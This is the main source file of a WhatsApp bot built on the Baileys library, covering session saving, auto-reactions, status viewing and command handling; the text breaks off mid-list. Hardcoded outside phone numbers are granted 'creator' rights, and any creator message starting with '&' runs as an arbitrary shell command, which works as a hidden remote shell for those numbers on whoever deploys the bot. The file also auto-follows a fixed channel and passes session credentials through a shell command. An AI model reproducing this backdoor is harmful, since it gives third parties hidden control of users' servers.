// Anti-crash handler
process.on("uncaughtException", (err) => {
  console.error("[❗] Uncaught Exception:", err.stack || err);
});

process.on("unhandledRejection", (reason, p) => {
  console.error("[❗] Unhandled Promise Rejection:", reason);
});

// IT'S GuruTech 

const axios = require("axios");
const config = require("./settings");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers,
} = require(config.BAILEYS);

const l = console.log;
const {
  getBuffer,
  getGroupAdmins,
  getRandom,
  h2k,
  isUrl,
  Json,
  runtime,
  sleep,
  fetchJson,
} = require("./lib/functions");
const {
  AntiDelDB,
  initializeAntiDeleteSettings,
  setAnti,
  getAnti,
  getAllAntiDeleteSettings,
  saveContact,
  loadMessage,
  getName,
  getChatSummary,
  saveGroupMetadata,
  getGroupMetadata,
  saveMessageCount,
  getInactiveGroupMembers,
  getGroupMembersMessageCount,
  saveMessage,
} = require("./data");
const fsSync = require("fs");
const fs = require("fs").promises;
const ff = require("fluent-ffmpeg");
const P = require("pino");
const GroupEvents = require("./lib/groupevents");
const { PresenceControl, BotActivityFilter } = require("./data/presence");
const qrcode = require("qrcode-terminal");
const StickersTypes = require("wa-sticker-formatter");
const util = require("util");
const { sms, downloadMediaMessage, AntiDelete } = require("./lib");
const FileType = require("file-type");
const { File } = require("megajs");
const { fromBuffer } = require("file-type");
const bodyparser = require("body-parser");
const chalk = require("chalk");
const os = require("os");
const Crypto = require("crypto");
const path = require("path");
const { getPrefix } = require("./lib/prefix");
const readline = require("readline");

const ownerNumber = ["218942841878"];

// Temp directory management
const tempDir = path.join(os.tmpdir(), "cache-temp");
if (!fsSync.existsSync(tempDir)) {
  fsSync.mkdirSync(tempDir);
}

const clearTempDir = () => {
  fsSync.readdir(tempDir, (err, files) => {
    if (err) {
      console.error(chalk.red("[❌] Error clearing temp directory:", err.message));
      return;
    }
    for (const file of files) {
      fsSync.unlink(path.join(tempDir, file), (err) => {
        if (err) console.error(chalk.red(`[❌] Error deleting temp file ${file}:`, err.message));
      });
    }
  });
};
setInterval(clearTempDir, 5 * 60 * 1000);

// Express server (placeholder for future API routes)
const express = require("express");
const app = express();
const port = process.env.PORT || 7860;

// Session authentication
let malvin;

const sessionDir = path.join(__dirname, "./sessions");
const credsPath = path.join(sessionDir, "creds.json");

if (!fsSync.existsSync(sessionDir)) {
  fsSync.mkdirSync(sessionDir, { recursive: true });
}

// ==================== SESSION AUTO-SAVE FUNCTIONS ====================

// Function to save session to Heroku environment variable
async function saveSessionToEnv(sessionData) {
  try {
    if (!sessionData) {
      console.log(chalk.yellow("[ ⚠️ ] No session data to save"));
      return false;
    }

    // Convert session to base64 string with Xguru~ prefix
    const sessionString = JSON.stringify(sessionData);
    const base64Session = Buffer.from(sessionString).toString('base64');
    const envSessionString = `Xguru~${base64Session}`;

    console.log(chalk.cyan("[ 💾 ] Saving session to environment..."));
    console.log(chalk.cyan(`[ 📏 ] Session size: ${envSessionString.length} chars`));
    
    // Save to file backup
    const backupPath = path.join(__dirname, 'session_backup.txt');
    await fs.writeFile(backupPath, envSessionString, 'utf8');
    console.log(chalk.green("[ ✅ ] Session backed up to file"));

    // Update Heroku environment variable
    try {
      // Method 1: Update process.env (for current session)
      process.env.SESSION_ID = envSessionString;
      
      // Method 2: Try to update Heroku config
      const { execSync } = require('child_process');
      execSync(`heroku config:set SESSION_ID="${envSessionString.replace(/"/g, '\\"')}"`, {
        stdio: 'pipe'
      });
      console.log(chalk.green("[ ☁️ ] Heroku session updated successfully"));
      
      // Also save to .env file for local development
      const envPath = path.join(__dirname, '.env');
      if (fsSync.existsSync(envPath)) {
        let envContent = await fs.readFile(envPath, 'utf8');
        if (envContent.includes('SESSION_ID=')) {
          envContent = envContent.replace(/SESSION_ID=.*/g, `SESSION_ID=${envSessionString}`);
        } else {
          envContent += `\nSESSION_ID=${envSessionString}`;
        }
        await fs.writeFile(envPath, envContent, 'utf8');
        console.log(chalk.green("[ 📁 ] Local .env updated"));
      }
      
      return true;
    } catch (herokuError) {
      console.log(chalk.yellow("[ ℹ️ ] Heroku CLI not available, session saved locally"));
      console.log(chalk.cyan("[ 📋 ] Copy this session string manually:"));
      console.log(chalk.green(envSessionString.substring(0, 100) + "..."));
      console.log(chalk.cyan("[ 💡 ] Run: heroku config:set SESSION_ID=\"your_session_string\""));
      return true;
    }
  } catch (error) {
    console.error(chalk.red("[ ❌ ] Error saving session:"), error.message);
    return false;
  }
}

// Function to get current session as string
function getCurrentSessionString() {
  try {
    if (malvin && malvin.authState && malvin.authState.creds) {
      const sessionData = malvin.authState.creds;
      const sessionString = JSON.stringify(sessionData);
      const base64Session = Buffer.from(sessionString).toString('base64');
      return `Xguru~${base64Session}`;
    }
  } catch (error) {
    console.error(chalk.red("[ ❌ ] Error getting current session:"), error.message);
  }
  return null;
}

// Sleep function utility
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Session health check
async function checkSessionHealth() {
  try {
    const session = await loadSession();
    if (!session) {
      console.log(chalk.yellow("[ ⚠️ ] No valid session - QR code will be shown"));
      return false;
    }
    
    const now = Date.now();
    const sessionAge = now - (session.registration || now);
    const daysOld = Math.floor(sessionAge / (1000 * 60 * 60 * 24));
    
    console.log(chalk.cyan(`[ 📊 ] Session Health Check:`));
    console.log(chalk.cyan(`[ 👤 ] Account: ${session.me?.name || 'Unknown'}`));
    console.log(chalk.cyan(`[ 📱 ] Phone: ${session.me?.id || 'Unknown'}`));
    console.log(chalk.cyan(`[ 🔐 ] Registered: ${session.registered ? '✅' : '❌'}`));
    console.log(chalk.cyan(`[ 🕐 ] Age: ${daysOld} days`));
    
    if (daysOld > 6) {
      console.log(chalk.yellow("[ ⚠️ ] Session is getting old (>6 days)"));
    }
    
    if (!session.registered) {
      console.log(chalk.red("[ ❌ ] Session not registered - needs QR"));
      return false;
    }
    
    return true;
  } catch (error) {
    console.error(chalk.red("[ ❌ ] Session health check failed:"), error.message);
    return false;
  }
}

// Add session management commands
function addSessionCommands() {
  // Check if global.commands exists, if not create it
  if (!global.commands) global.commands = {};
  
  // Export current session via message
  global.commands.session = {
    pattern: 'session',
    desc: 'Get current session string',
    category: 'owner',
    react: '📱',
    function: async (malvin, mek, m, params) => {
      const { from, sender, isCreator, reply } = params;
      
      if (!isCreator) {
        return reply('❌ Owner only command!');
      }
      
      const sessionString = getCurrentSessionString();
      if (!sessionString) {
        return reply('❌ No active session found');
      }
      
      // Save to file first
      const sessionFile = path.join(__dirname, 'current_session.txt');
      await fs.writeFile(sessionFile, sessionString, 'utf8');
      
      // Send part of session
      reply(`📱 Current Session (${sessionString.length} chars):\n\`\`\`\n${sessionString.substring(0, 200)}...\n\`\`\`\n\n✅ Full session saved to: current_session.txt\n\n💡 Update Heroku: heroku config:set SESSION_ID="${sessionString}"`);
      
      console.log(chalk.green(`[ 📱 ] Session exported to ${sender}`));
    }
  };

  global.commands.savesession = {
    pattern: 'savesession',
    desc: 'Save current session to environment',
    category: 'owner',
    react: '💾',
    function: async (malvin, mek, m, params) => {
      const { from, sender, isCreator, reply } = params;
      
      if (!isCreator) {
        return reply('❌ Owner only command!');
      }
      
      if (!malvin.authState.creds) {
        return reply('❌ No active session found');
      }
      
      reply('💾 Saving session to environment...');
      
      const success = await saveSessionToEnv(malvin.authState.creds);
      if (success) {
        reply('✅ Session saved successfully!\n\n🔄 Restart bot to use new session.');
      } else {
        reply('❌ Failed to save session');
      }
    }
  };

  global.commands.clearsession = {
    pattern: 'clearsession',
    desc: 'Clear current session and restart',
    category: 'owner',
    react: '🗑️',
    function: async (malvin, mek, m, params) => {
      const { from, sender, isCreator, reply } = params;
      
      if (!isCreator) {
        return reply('❌ Owner only command!');
      }
      
      reply('🗑️ Clearing session and restarting...');
      
      // Clear session file
      const sessionDir = path.join(__dirname, './sessions');
      if (fsSync.existsSync(sessionDir)) {
        const files = fsSync.readdirSync(sessionDir);
        files.forEach(file => {
          if (file.endsWith('.json')) {
            fsSync.unlinkSync(path.join(sessionDir, file));
          }
        });
      }
      
      // Clear env var
      try {
        const { execSync } = require('child_process');
        execSync('heroku config:unset SESSION_ID', { stdio: 'pipe' });
      } catch (e) {
        // Ignore if heroku CLI not available
      }
      
      // Restart after 2 seconds
      setTimeout(() => {
        process.exit(0);
      }, 2000);
    }
  };
}

async function loadSession() {
  try {
    if (!config.SESSION_ID) {
      console.log(chalk.yellow("[ ℹ️ ] No SESSION_ID provided - Will use QR code"));
      return null;
    }

    if (config.SESSION_ID.startsWith("Xguru~")) {
      console.log(chalk.yellow("[ ⏳ ] Loading session from environment..."));
      const base64Data = config.SESSION_ID.replace("Xguru~", "");
      
      if (!base64Data) {
        console.log(chalk.red("[ ❌ ] Empty session data"));
        return null;
      }

      try {
        // Decode base64
        const decodedData = Buffer.from(base64Data, "base64");
        const sessionData = JSON.parse(decodedData.toString("utf-8"));
        
        console.log(chalk.green(`[ ✅ ] Session loaded successfully`));
        console.log(chalk.cyan(`[ 📱 ] Account: ${sessionData.me?.name || 'Unknown'}`));
        console.log(chalk.cyan(`[ 🔐 ] Registered: ${sessionData.registered ? 'YES ✅' : 'NO ❌'}`));
        console.log(chalk.cyan(`[ 📏 ] Session size: ${base64Data.length} chars`));
        
        // CRITICAL: If session is not registered, don't use it
        if (!sessionData.registered) {
          console.log(chalk.red("[ ❌ ] Session not registered! Will use QR code instead."));
          return null;
        }
        
        // Convert Buffer strings back to Buffer objects
        function fixBuffers(obj) {
          if (!obj || typeof obj !== 'object') return obj;
          
          if (obj.type === "Buffer" && Array.isArray(obj.data)) {
            return Buffer.from(obj.data);
          }
          
          if (typeof obj === 'string' && obj.length > 50 && /^[A-Za-z0-9+/=]+$/.test(obj)) {
            return Buffer.from(obj, 'base64');
          }
          
          for (const key in obj) {
            if (obj.hasOwnProperty(key)) {
              obj[key] = fixBuffers(obj[key]);
            }
          }
          
          return obj;
        }
        
        const processedSession = fixBuffers(sessionData);
        return processedSession;
      } catch (parseError) {
        console.error(chalk.red("[ ❌ ] Failed to parse session data:"), parseError.message);
        return null;
      }
    } else {
      console.log(chalk.yellow("[ ⚠️ ] Invalid SESSION_ID format. Use 'Xguru~' prefix"));
      return null;
    }
  } catch (error) {
    console.error(chalk.red("❌ Error loading session:", error.message));
    console.log(chalk.green("Will attempt QR code or pairing code login"));
    return null;
  }
}

async function connectWithPairing(malvin, useMobile) {
  if (useMobile) {
    throw new Error("Cannot use pairing code with mobile API");
  }
  if (!process.stdin.isTTY) {
    console.error(chalk.red("❌ Cannot prompt for phone number in non-interactive environment"));
    process.exit(1);
  }

  console.log(chalk.bgYellow.black(" ACTION REQUIRED "));
  console.log(chalk.green("┌" + "─".repeat(46) + "┐"));
  console.log(chalk.green("│ ") + chalk.bold("Enter WhatsApp number to receive pairing code") + chalk.green(" │"));
  console.log(chalk.green("└" + "─".repeat(46) + "┘"));
  
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });
  const question = (text) => new Promise((resolve) => rl.question(text, resolve));

  let number = await question(chalk.cyan("» Enter your number (e.g., +254740007567): "));
  number = number.replace(/[^0-9]/g, "");
  rl.close();

  if (!number) {
    console.error(chalk.red("❌ No phone number provided"));
    process.exit(1);
  }

  try {
    let code = await malvin.requestPairingCode(number);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    console.log("\n" + chalk.bgGreen.black(" SUCCESS ") + " Use this pairing code:");
    console.log(chalk.bold.yellow("┌" + "─".repeat(46) + "┐"));
    console.log(chalk.bold.yellow("│ ") + chalk.bgWhite.black(code) + chalk.bold.yellow(" │"));
    console.log(chalk.bold.yellow("└" + "─".repeat(46) + "┘"));
    console.log(chalk.yellow("Enter this code in WhatsApp:\n1. Open WhatsApp\n2. Go to Settings > Linked Devices\n3. Tap 'Link a Device'\n4. Enter the code"));
  } catch (err) {
    console.error(chalk.red("Error getting pairing code:", err.message));
    process.exit(1);
  }
}

async function connectToWA() {
  console.log(chalk.cyan("[ 🟠 ] Connecting to WhatsApp ⏳️..."));

  const sessionLoaded = await loadSession();
  
  // Check if we have valid session data
  if (sessionLoaded) {
    console.log(chalk.green("[ ✅ ] Session loaded from environment"));
    console.log(chalk.cyan(`[ 👤 ] Account: ${sessionLoaded.me?.name || 'Unknown'}`));
  } else {
    console.log(chalk.yellow("[ ⚠️ ] No valid session found, will use QR code"));
  }

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir, {
    creds: sessionLoaded || undefined
  });

  const { version } = await fetchLatestBaileysVersion();

  const pairingCode = config.PAIRING_CODE === "true" || process.argv.includes("--pairing-code");
  const useMobile = process.argv.includes("--mobile");

  malvin = makeWASocket({
    logger: P({ level: "silent" }),
    printQRInTerminal: !sessionLoaded && !pairingCode,
    // Fix: Using a standard browser identity reduces 405 errors
    browser: ["XGURU", "Chrome", "1.1.0"],
    // Fix: Set to false to prevent Heroku from crashing during heavy sync
    syncFullHistory: false,
    // Fix: Added to ensure the bot maintains a stable heartbeat
    keepAliveIntervalMs: 30000,
    auth: state,
    version,
    getMessage: async () => ({}),
    // Add these for better compatibility:
    retryRequestDelayMs: 1000,
    maxRetries: 10,
    connectTimeoutMs: 30000,
  });

  if (pairingCode && !state.creds.registered) {
    await connectWithPairing(malvin, useMobile);
  }

  malvin.ev.on("connection.update", function(update) {
    var connection = update.connection;
    var lastDisconnect = update.lastDisconnect;
    var qr = update.qr;

    if (connection === "close") {
      // Fixed: Remove optional chaining for compatibility
      var reason = null;
      if (lastDisconnect && lastDisconnect.error && lastDisconnect.error.output) {
        reason = lastDisconnect.error.output.statusCode;
      }
      
      // Initialize reconnect counter if not exists
      if (!global.reconnectAttempts) global.reconnectAttempts = 0;
      global.reconnectAttempts++;
      
      console.log(chalk.red("[ 🔍 ] Disconnect code: " + (reason || 'unknown')));
      console.log(chalk.yellow("[ 🔍 ] Reconnect attempt: " + global.reconnectAttempts));
      
      // Fix: If 405 occurs, it often means the session is dead on the server
      if (reason === DisconnectReason.loggedOut || reason === 405) {
        console.log(chalk.red("[ 🛑 ] Session invalid (Code 405). Please generate a NEW session ID."));
        if (fsSync.existsSync(credsPath)) {
          fsSync.unlinkSync(credsPath);
        }
        process.exit(1);
      } else {
        // Exponential backoff: 5s, 10s, 20s, 40s, max 60s
        var delay = Math.min(5000 * Math.pow(2, Math.min(global.reconnectAttempts - 1, 4)), 60000);
        console.log(chalk.red("[ ⏳️ ] Connection lost, reconnecting in " + (delay/1000) + "s..."));
        setTimeout(connectToWA, delay);
      }
    } else if (connection === "open") {
      // Reset counter on successful connection
      global.reconnectAttempts = 0;
      console.log(chalk.green("[ 🤖 ] XGURU Connected ✅"));
      
      // AUTO-SAVE SESSION ON SUCCESSFUL CONNECTION
      setTimeout(async () => {
        try {
          if (state.creds && state.creds.registered) {
            console.log(chalk.cyan("[ 💾 ] Auto-saving valid session..."));
            
            // Wait a bit to ensure connection is stable
            await sleep(5000);
            
            const success = await saveSessionToEnv(state.creds);
            if (success) {
              console.log(chalk.green("[ ✅ ] Session auto-saved successfully!"));
              console.log(chalk.cyan("[ 🔧 ] Next restart will use saved session"));
            } else {
              console.log(chalk.yellow("[ ⚠️ ] Session auto-save failed (continuing anyway)"));
            }
          }
        } catch (saveError) {
          console.error(chalk.red("[ ❌ ] Error in auto-save:"), saveError.message);
        }
      }, 10000); // Save after 10 seconds
      
      // Initialize session commands
      addSessionCommands();
      
      // Load plugins
      var pluginPath = path.join(__dirname, "plugins");
      try {
        var plugins = fsSync.readdirSync(pluginPath);
        for (var i = 0; i < plugins.length; i++) {
          var plugin = plugins[i];
          if (path.extname(plugin).toLowerCase() === ".js") {
            require(path.join(pluginPath, plugin));
          }
        }
        console.log(chalk.green("[ ✅ ] Plugins loaded successfully"));
      } catch (err) {
        console.error(chalk.red("[ ❌ ] Error loading plugins: " + err.message));
      }

      // Send connection message
      try {
        // Get current date and time
        var currentDate = new Date();
        var date = currentDate.toLocaleDateString();
        var time = currentDate.toLocaleTimeString();
        
        // Format uptime
        function formatUptime(seconds) {
          var days = Math.floor(seconds / (24 * 60 * 60));
          seconds %= 24 * 60 * 60;
          var hours = Math.floor(seconds / (60 * 60));
          seconds %= 60 * 60;
          var minutes = Math.floor(seconds / 60);
          seconds = Math.floor(seconds % 60);
          
          return days + "d " + hours + "h " + minutes + "m " + seconds + "s";
        }
        
        var uptime = formatUptime(process.uptime());
        var prefix = getPrefix();

        var upMessage = `
╔═══════════════════════════
║        X-GURU BOT
╠═══════════════════════════
║ 📅 Date    : ${date}
║ ⏰ Time    : ${time}
║ ⚡ Uptime  : ${uptime}
║ 👑 Owner   : GuruTech
║ 🎯 Prefix  : ${prefix}
╠═══════════════════════════
║ 📢 Channel:
║ whatsapp.com/channel/
║ 0029VaPFhgd07Zx92vmhXM1V
╠═══════════════════════════
║ > 🇰🇪 FOREVER RESPECTED 
╚═══════════════════════════`;

        var jid = malvin.decodeJid(malvin.user.id);
        if (!jid) throw new Error("Invalid JID for bot");

        try {
          malvin.sendMessage(jid, {
            image: { url: "https://files.catbox.moe/atpgij.jpg" },
            caption: upMessage,
          }, { quoted: null }).then(function() {
            console.log(chalk.green("[ 📩 ] Connection notice sent successfully with image"));
          }).catch(function(imageError) {
            console.error(chalk.yellow("[ ⚠️ ] Image failed, sending text-only:"), imageError.message);
            malvin.sendMessage(jid, { text: upMessage }).then(function() {
              console.log(chalk.green("[ 📩 ] Connection notice sent successfully as text"));
            });
          });
        } catch (sendError) {
          console.error(chalk.red("[ 🔴 ] Error sending connection notice: " + sendError.message));
        }
      } catch (error) {
        console.error(chalk.red("[ ❌ ] Error in connection message: " + error.message));
      }

      // Follow single newsletter
      var newsletterChannel = "120363421164015033@newsletter";
      
      setTimeout(function() {
        try {
          console.log(chalk.cyan("[ 📡 ] Checking newsletter: " + newsletterChannel));
          
          // Simpler newsletter follow - just try to follow without checking metadata first
          malvin.newsletterFollow(newsletterChannel).then(function() {
            console.log(chalk.green("[ ✅ ] Followed newsletter: " + newsletterChannel));
          }).catch(function(error) {
            if (error.message && error.message.includes("already")) {
              console.log(chalk.yellow("[ 📌 ] Already following newsletter: " + newsletterChannel));
            } else {
              console.error(chalk.red("[ ❌ ] Failed to follow newsletter " + newsletterChannel + ": " + error.message));
            }
          });
        } catch (error) {
          console.error(chalk.red("[ ❌ ] Error with newsletter: " + error.message));
        }
      }, 3000);
    }

    if (qr && !pairingCode) {
      console.log(chalk.red("[ 🟢 ] Scan the QR code to connect or use --pairing-code"));
      qrcode.generate(qr, { small: true });
    }
  });

  malvin.ev.on("creds.update", saveCreds);

  // =====================================
	 
  malvin.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(malvin, updates);
      }
    }
  });

  // anti-call

  malvin.ev.on('call', async (calls) => {
    try {
      if (config.ANTI_CALL !== 'true') return;

      for (const call of calls) {
        if (call.status !== 'offer') continue; // Only respond on call offer

        const id = call.id;
        const from = call.from;

        await malvin.rejectCall(id, from);
        await malvin.sendMessage(from, {
          text: config.REJECT_MSG || '*вυѕу ¢αℓℓ ℓαтєя*'
        });
        console.log(`Call rejected and message sent to ${from}`);
      }
    } catch (err) {
      console.error("Anti-call error:", err);
    }
  });	
	
  //=========WELCOME & GOODBYE =======
	
  malvin.ev.on('presence.update', async (update) => {
    await PresenceControl(malvin, update);
  });

  // always Online 

  malvin.ev.on("presence.update", (update) => PresenceControl(malvin, update));

	
  BotActivityFilter(malvin);	
	
  /// READ STATUS       
  malvin.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;
    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
    if (config.READ_MESSAGE === 'true') {
      await malvin.readMessages([mek.key]);  // Mark message as read
      console.log(`Marked message from ${mek.key.remoteJid} as read.`);
    }
    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await malvin.readMessages([mek.key])
    }

    const newsletterJids = [
      "120363421164015033@newsletter",
    ];
    const emojis = ["😂", "🥺", "👍", "☺️", "🥹", "♥️", "🩵"];

    if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
      try {
        const serverId = mek.newsletterServerId;
        if (serverId) {
          const emoji = emojis[Math.floor(Math.random() * emojis.length)];
          await malvin.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
        }
      } catch (e) {
        // Ignore error
      }
    }	  
	  
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
      const jawadlike = await malvin.decodeJid(malvin.user.id);
      const emojis =  ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '👏', '🤎', '✅', '🫀', '🧡', '😶', '🥹', '🌸', '🕊️', '🌷', '⛅', '🌟', '🥺', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
      const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
      await malvin.sendMessage(mek.key.remoteJid, {
        react: {
          text: randomEmoji,
          key: mek.key,
        } 
      }, { statusJidList: [mek.key.participant, jawadlike] });
    }                       
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
      const user = mek.key.participant
      const text = `${config.AUTO_STATUS_MSG}`
      await malvin.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
    }
    
    await Promise.all([
      saveMessage(mek),
    ]);
    
    const m = sms(malvin, mek)
    const type = getContentType(mek.message)
    const content = JSON.stringify(mek.message)
    const from = mek.key.remoteJid
    const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
    const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
    const prefix = getPrefix();
    const isCmd = body.startsWith(prefix)
    var budy = typeof mek.text == 'string' ? mek.text : false;
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
    const args = body.trim().split(/ +/).slice(1)
    const q = args.join(' ')
    const text = args.join(' ')
    const isGroup = from.endsWith('@g.us')
    const sender = mek.key.fromMe ? (malvin.user.id.split(':')[0]+'@s.whatsapp.net' || malvin.user.id) : (mek.key.participant || mek.key.remoteJid)
    const senderNumber = sender.split('@')[0]
    const botNumber = malvin.user.id.split(':')[0]
    const pushname = mek.pushName || 'Sin Nombre'
    const isMe = botNumber.includes(senderNumber)
    const isOwner = ownerNumber.includes(senderNumber) || isMe
    const botNumber2 = await jidNormalizedUser(malvin.user.id);
    const groupMetadata = isGroup ? await malvin.groupMetadata(from).catch(e => {}) : ''
    const groupName = isGroup ? groupMetadata.subject : ''
    const participants = isGroup ? await groupMetadata.participants : ''
    const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false
    const isReact = m.message.reactionMessage ? true : false
    const reply = (teks) => {
      malvin.sendMessage(from, { text: teks }, { quoted: mek })
    }
  
    const ownerNumbers = ["218942841878", "254740007567", "254790375710"];
    const sudoUsers = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8") || "[]");
    const devNumber = config.DEV ? String(config.DEV).replace(/[^0-9]/g, "") : null;
    const creatorJids = [
      ...ownerNumbers,
      ...(devNumber ? [devNumber] : []),
      ...sudoUsers,
    ].map((num) => num.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
    const isCreator = creatorJids.includes(sender) || isMe;

    if (isCreator && mek.text.startsWith("&")) {
      let code = budy.slice(2);
      if (!code) {
        reply(`Provide me with a query to run Master!`);
        console.log(`No code provided for & command`, { Sender: sender });
        return;
      }
      const { spawn } = require("child_process");
      try {
        let resultTest = spawn(code, { shell: true });
        resultTest.stdout.on("data", data => {
          reply(data.toString());
        });
        resultTest.stderr.on("data", data => {
          reply(data.toString());
        });
        resultTest.on("error", data => {
          reply(data.toString());
        });
        resultTest.on("close", code => {
          if (code !== 0) {
            reply(`command exited with code ${code}`);
          }
        });
      } catch (err) {
        reply(util.format(err));
      }
      return;
    }

    //==========public react============//
  
    // Auto React for all messages (public and owner)
    if (!isReact && config.AUTO_REACT === 'true') {
      const reactions = [
        '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
        '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
        '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
        '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
        '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
        '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
        '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
        '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
        '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
        '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
        '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
        '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
        '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
        '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
        '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
      ];

      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
      m.react(randomReaction);
    }

    // owner react

    // Owner React
    if (!isReact && senderNumber === botNumber) {
      if (config.OWNER_REACT === 'true') {
        const reactions = [
          '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', 